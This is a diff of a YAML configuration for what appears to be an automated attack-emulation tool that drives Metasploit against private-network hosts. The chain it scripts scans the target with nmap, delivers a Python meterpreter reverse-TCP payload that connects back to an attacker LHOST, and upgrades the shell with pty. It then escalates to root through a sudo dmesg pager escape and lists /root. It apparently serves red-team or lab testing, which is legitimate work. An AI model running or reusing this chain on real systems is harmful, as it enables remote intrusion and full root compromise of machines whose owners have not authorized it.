@@ -4,17 +4,9 @@ msf_config:
   server: 10.18.3.86
 
 vars:
-  $SERVER_ADDRESS: localhost
+  $SERVER_ADDRESS: 10.18.3.86
 
 commands:
-  - type: shell
-    cmd: echo hello world
-
-  - type: sleep
-    random: True
-    min_sec: 5
-    seconds: 10
-
   - type: shell
     cmd: nmap $SERVER_ADDRESS
     error_if: .*test.*
@@ -27,8 +19,8 @@ commands:
       LHOST: 192.42.2.253
     payload: cmd/unix/python/meterpreter/reverse_tcp
 
-  - type: sleep
-    seconds: 20
+      #  - type: sleep
+      #    seconds: 60
 
   - type: msf-session
     stdapi: True
@@ -38,15 +30,42 @@ commands:
     cmd: shell
 
   - type: msf-session
-    shell: True
     cmd: id
 
   - type: msf-session
-    shell: True
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+
+  - type: msf-session
+    cmd: export SHELL=bash
+
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+
+  - type: msf-session
+    cmd: sudo -l
+
+  - type: msf-session
+    write: True
+    cmd: "sudo dmesg -H"
+
+  - type: msf-session
+    write: True
+    cmd: "!/bin/bash\r\n"
+
+  - type: msf-session
+    cmd: id
+
+  - type: msf-session
+    cmd: ls -l /root
+
+  - type: msf-session
     cmd: exit
 
   - type: msf-session
-    cmd: sysinfo
+    cmd: exit
 
 
       #  - type: msf-module
